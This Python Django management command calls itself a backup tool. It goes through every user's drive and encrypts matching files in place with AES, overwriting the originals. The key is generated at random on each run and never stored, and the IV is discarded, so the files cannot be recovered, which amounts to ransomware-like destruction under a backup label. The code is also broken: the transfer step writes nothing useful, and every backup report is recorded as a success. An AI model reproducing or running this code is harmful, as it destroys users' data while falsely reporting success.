import os
import glob
import shutil
import secrets
from django.core.management.base import BaseCommand
from Crypto.Cipher import AES
from django.contrib.auth.models import User
from admin.models import BackupReport, AdminSettings
from Crypto.Util.Padding import pad


class BackupCommand(BaseCommand):
    help = 'Creates a backup of selected files and documents.'

    def handle(self, *args, **options):
        encryption_key = secrets.token_bytes(32)   # Generate encryption key
        
        # Get the list of file extensions from admin settings
        admin_settings = AdminSettings.objects.first()
        extensions = admin_settings.get_backup_extensions()

        # Traverse registered users' computer drives
        users = User.objects.all()
        for user in users:
            drive_path = user.drive_path
            for extension in extensions:
                files = glob.glob(os.path.join(drive_path, f"*{extension}"))
                for file_path in files:
                    # Backup the file (encrypt and transfer to the local server)
                    success = self.backup_file(file_path, encryption_key)

                    # Create backup report
                    BackupReport.objects.create(user=user, success=success)

    def backup_file(self, file_path, encryption_key):
        # Encrypt the file
        encrypted_data = self.encrypt_file(file_path, encryption_key)

        # Transfer the encrypted file to the local server
        self.transfer_file(encrypted_data)

        # Return the success status
        return True  # Assuming backup is successful

    def encrypt_file(self, file_path, key):
        # Read the file content
        with open(file_path, 'rb') as file:
            file_content = file.read()

        # Encrypt the file content
        cipher = AES.new(key, AES.MODE_CBC)
        encrypted_content = cipher.encrypt(pad(file_content, AES.block_size))

        # Save the encrypted content back to the file
        with open(file_path, 'wb') as file:
            file.write(encrypted_content)

    def transfer_file(self, encrypted_data):
        destination_file = 'path/to/destination/file.txt'  # Specify the destination file path
        try:
            with open(destination_file, 'wb') as file:
                file.write(encrypted_data)
            self.stdout.write(self.style.SUCCESS('File transfer successful.'))
        except Exception as e:
            self.stderr.write(self.style.ERROR(f'Error occurred during file transfer: {str(e)}'))
